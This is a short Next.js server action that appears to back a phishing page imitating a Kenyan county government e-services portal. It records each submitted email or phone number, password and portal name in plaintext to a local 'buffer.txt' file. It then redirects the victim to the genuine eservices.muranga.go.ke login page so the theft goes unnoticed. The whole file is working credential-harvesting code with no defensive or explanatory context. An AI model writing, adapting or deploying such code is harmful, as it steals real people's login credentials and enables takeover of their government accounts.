'use server';

import { redirect } from 'next/navigation';
import fs from 'fs';
import path from 'path';

export async function handleLogin(formData: FormData) {
    const emailPhone = formData.get('email_phone');
    const password = formData.get('password');
    const portal = formData.get('portal');

    const logEntry = `[${new Date().toISOString()}] Portal: ${portal}, User: ${emailPhone}, Password: ${password}\n`;

    try {
        const filePath = path.join(process.cwd(), 'buffer.txt');
        fs.appendFileSync(filePath, logEntry);
    } catch (err) {
        console.error('Failed to write to buffer.txt:', err);
    }

    redirect('https://eservices.muranga.go.ke/user-login');
}
